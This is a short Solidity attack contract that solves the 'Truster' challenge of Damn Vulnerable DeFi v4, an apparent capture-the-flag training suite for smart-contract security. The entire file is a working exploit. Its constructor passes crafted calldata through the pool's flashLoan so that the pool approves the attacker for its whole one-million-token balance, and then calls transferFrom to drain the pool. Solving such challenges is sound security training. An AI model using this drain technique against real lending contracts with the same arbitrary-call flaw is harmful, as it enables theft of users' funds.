// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
// Attack contract for Truster.t.sol

pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";


contract Attack  {
    uint256 internal constant AMNT_IN_POOL = 1_000_000e18;

    constructor(address _pool, address _token, address recoveryAddress) payable {
        // Create the pool
        TrusterLenderPool pool = TrusterLenderPool(_pool);
        // Manipulate data
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), AMNT_IN_POOL);

        // Call `flashLoan` function for the pool
        pool.flashLoan(0, address(this), _token, data);
        DamnValuableToken token = DamnValuableToken(_token);
        // Use `transferFrom` function to transfer the drained tokens
        token.transferFrom(_pool, address(recoveryAddress), AMNT_IN_POOL);
    }

}